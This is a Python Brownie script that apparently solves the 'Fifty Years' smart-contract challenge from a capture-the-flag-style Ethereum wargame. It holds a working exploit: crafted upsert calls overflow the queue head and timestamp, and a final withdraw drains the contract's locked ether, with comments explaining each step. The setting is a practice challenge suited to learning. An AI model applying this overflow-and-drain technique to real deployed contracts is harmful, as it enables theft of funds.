from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import FiftyYearsChallenge
from math import floor

##########################################
# This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later.
# All you have to do to complete this challenge is wait 50 years and withdraw the ether. If you’re not that patient, you’ll need to combine several techniques to hack this contract.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        fifty_years = load_challenge(ContractObject=FiftyYearsChallenge, instance_key='fifty_years')
    else:
        # _from, acc = define_from_acc(1)
        fifty_years = deploy_locally(ContractObject=FiftyYearsChallenge, from_account=_from | {'value':1e18}, constructor_params=[acc.address])
    
        # get queue function for modified challenge contract
        # using abiencoderv2
        # def getQueue(): return fifty_years.getQueue()

    # call upsert with `index` > queue.length and > head
    # this will replace `head` with type(uint256).max minus the seconds in a day
    # and `queue.length` with what we send as value (1)
    fifty_years.upsert(1,2**256-86400, _from | {'value':1})

    # then replace `head` with 0 and also the timestamp in the 2nd struct
    # in queue with 0, so that `block.timestamp` is always larger than its value
    fifty_years.upsert(1,0, _from | {'value':1})

    # then call withdraw with the index of the second element, which will
    # withdraw the sum of all the `amount` in every single struct within queue
    # including the first one
    fifty_years.withdraw(1, _from)

    # check if the challenge is complete
    result = fifty_years.isComplete()
    print(result)
    
    # return the result
    return result

def main():
    solve_challenge()
